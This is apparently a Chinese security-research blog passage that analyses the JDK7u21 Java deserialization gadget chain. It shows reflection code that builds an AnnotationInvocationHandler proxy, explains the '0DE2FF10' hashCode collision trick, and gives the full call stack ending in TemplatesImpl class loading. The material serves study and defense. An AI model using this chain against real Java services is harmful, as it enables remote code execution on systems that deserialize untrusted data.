二、    AnnotationInvocationHandler

第一部分关于TemplatesImpl的代码于Click1链分析过了，不再赘述，直接来到第二部分。
这次我们不从readObject开始往前追，而是先分析为什么要用AnnotationInvocationHandler类。
这是一个实现了动态代理(InvocationHandler接口)的类，想要使用它，如下。

        Templates TemplatesProxy = (Templates)Proxy.newProxyInstance(Templates.class.getClassLoader(), new Class[] {Templates.class}, ih);

Proxy.newProxyInstance()传入的三个参数，分别是类加载器，接口，InvocationHandler对象，然后返回一个代理对象，此时相当于hook了代理对象的所有方法，执行任意方法都会进入AnnotationInvocationHandler.invoke()。
动态代理详细知识参考如下:
https://blog.csdn.net/u012326462/article/details/81293186

但构造AnnotationInvocationHandler对象却比较麻烦，可以看到构造方法是没有权限修饰的，意味着default，所以需要用反射方法去构造。

    AnnotationInvocationHandler(Class class1, Map map){        memberMethods = null;        type = class1;        memberValues = map;    }

具体如下。

        Class clazz_AIH = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");        Constructor cons_AIH = clazz_AIH.getDeclaredConstructor(Class.class, Map.class);        cons_AIH.setAccessible( true );        InvocationHandler ih = (InvocationHandler)cons_AIH.newInstance(Templates.class, hm);


我们先写一个不需要HashSet参与的命令执行。

一个equals()为什么就做到了呢？由于动态代理，equals()被hook，实际执行了AnnotationInvocationHandler.invoke()

    public Object invoke(Object obj, Method method, Object aobj[])    {        String s = method.getName();        Class aclass[] = method.getParameterTypes();        if(s.equals("equals") && aclass.length == 1 && aclass[0] == java/lang/Object)            return equalsImpl(aobj[0]);

这里obj为TemplatesProxy，method为equals，aobj[0]为obj，因此触发equalsImpl(aobj[0])，也就是AnnotationInvocationHandler.equalsImpl()

    private Boolean equalsImpl(Object obj)    {        if(obj == this)            return Boolean.valueOf(true);        if(!type.isInstance(obj))            return Boolean.valueOf(false);        Method amethod[] = getMemberMethods();        int i = amethod.length;        for(int j = 0; j < i; j++)        {            Method method = amethod[j];            String s = method.getName();            Object obj1 = memberValues.get(s);            Object obj2 = null;            AnnotationInvocationHandler annotationinvocationhandler = asOneOfUs(obj);            if(annotationinvocationhandler != null)                obj2 = annotationinvocationhandler.memberValues.get(s);            else                try                {                    obj2 = method.invoke(obj, new Object[0]);                }


if(!type.isInstance(obj))，这里要求this.type必须是obj的类，这里我们在实例化AnnotationInvocationHandler时，传入了Templates.class。

        InvocationHandler ih = (InvocationHandler)cons_AIH.newInstance(Templates.class, hm);

而obj也就是TemplatesImpl的父类也是Templates。当然也可以用反射的方式设置this.type为Templates.class。

if(annotationinvocationhandler != null)，这里跟一下asOneOfUs()就发现是在判断obj是否是代理类，显然不是，于是触发else分支。

    private AnnotationInvocationHandler asOneOfUs(Object obj)    {        if(Proxy.isProxyClass(obj.getClass()))        {            InvocationHandler invocationhandler = Proxy.getInvocationHandler(obj);            if(invocationhandler instanceof AnnotationInvocationHandler)                return (AnnotationInvocationHandler)invocationhandler;        }        return null;    }
obj2 = method.invoke(obj, new Object[0])

这里method是由getMemberMethods()获得一个Method组进行遍历执行。

    private Method[] getMemberMethods()    {        if(memberMethods == null)            memberMethods = (Method[])AccessController.doPrivileged(new PrivilegedAction() {

发现其实是就是取出this.type的所有方法进行执行，查看Templates类的方法。

也就是说这里HashMap.put()和URLDNS的HashMap.put()起到了一样的作用，如果先put就会直接触发，最后再put就只有反序列化的时候才会触发。且add()和readObject()一样可以触发命令执行。
我们先看一下HashSet.add()

    public boolean add(E e) {        return map.put(e, PRESENT)==null;    }

跟进HashMap.put()

    public V put(K key, V value) {        if (key == null)            return putForNullKey(value);        int hash = hash(key);        int i = indexFor(hash, table.length);        for (Entry<K,V> e = table[i]; e != null; e = e.next) {            Object k;            if (e.hash == hash && ((k = e.key) == key || key.equals(k))) {                V oldValue = e.value;                e.value = value;                e.recordAccess(this);                return oldValue;            }        }
        modCount++;        addEntry(hash, key, value, i);        return null;    }

HashMap的工作是存放KV键值对，这里i是搜索key的hash在表中的索引，for循环在遍历此索引的所有键值对，如果key已存在，也就是满足条件一【hash相等】，和条件二【能通过k=e.key或者 equals()】，则更新value。 


我们第一次add的是obj，触发addEntry将其存储，第二次add的是TemplatesProxy，有int hash = hash(key)，跟进HashMap.hash()

    final int hash(Object k) {        int h = 0;        if (useAltHashing) {            if (k instanceof String) {                return sun.misc.Hashing.stringHash32((String) k);            }            h = hashSeed;        }
        h ^= k.hashCode();

触发k.hashCode()，但注意，此时受动态代理影响，会调用AnnotationInvocationHandler.invoke()

    public Object invoke(Object obj, Method method, Object aobj[])    {        String s = method.getName();        Class aclass[] = method.getParameterTypes();        if(s.equals("equals") && aclass.length == 1 && aclass[0] == java/lang/Object)            return equalsImpl(aobj[0]);        if(!$assertionsDisabled && aclass.length != 0)            throw new AssertionError();        if(s.equals("toString"))            return toStringImpl();        if(s.equals("hashCode"))            return Integer.valueOf(hashCodeImpl());

调用AnnotationInvocationHandler.hashCodeImpl()

    private int hashCodeImpl()    {        int i = 0;        for(Iterator iterator = memberValues.entrySet().iterator(); iterator.hasNext();)        {            java.util.Map.Entry entry = (java.util.Map.Entry)iterator.next();            i += 127 * ((String)entry.getKey()).hashCode() ^ memberValueHashCode(entry.getValue());        }
        return i;    }

注意这个this.memberValues，正是我们创建AnnotationInvocationHandler对象时的hm。

        HashMap hm = new HashMap();        hm.put("0DE2FF10", obj);//F5A5A608......        InvocationHandler ih = (InvocationHandler)cons_AIH.newInstance(Templates.class, hm);

也就是说，这儿会遍历this.memberValues的hashcode，累加至i上返回，由于hm只put了一个值，那么

i=127 * ((String)entry.getKey()).hashCode() ^ memberValueHashCode(entry.getValue());

由于entry就是我们put进去的0DE2FF10和 obj，所以实际上为

i=127 * "0DE2FF10".hashCode() ^ obj.hashCode()

由于"0DE2FF10".hashCode()恰好等于0，那么

i= obj.hashCode()

见注释，常用的hashCode()为0的还有F5A5A608。

i=obj.hashCode()之后HashMap.put()就满足条件e.hash == hash了，因为lhs.add(obj)，前面put的也是obj，两个hash一致则索引i一致，就可以触发for循环去遍历和对比。

进入if，条件e.hash == hash满足，条件(k = e.key) == key不满足，触发key.equals(k)，而key为TemplatesProxy，k为obj，至此完成TemplatesProxy.equals(obj)。

这是直接add的触发方法，那么反序列化HashSet.readObject()呢，看代码最后也是依次map.put，调用栈几乎一样。

四、    总结

调用链如下
HashSet.readObject()
HashMap.put() //第一次传入obj(TemplatesImpl)
HashMap.addEntry()
HashMap.put() //第二次传入TemplatesProxy
HashMap.hash()
HashMap.hashCode() //被hook
AnnotationInvocationHandler.invoke()
AnnotationInvocationHandler.hashCodeImpl()
Object.equals() //被hook
AnnotationInvocationHandler.invoke()
AnnotationInvocationHandler.equalsImpl()
TemplatesImpl.newTransformer()
TemplatesImpl.getTransletInstance()
TemplatesImpl.defineTransletClasses()
TemplatesImpl$TransletClassLoader.defineClass()

非常精妙的一条反序列化链，原生JDK即可实现，还用上了hash碰撞的技巧，我愿称之为最强。
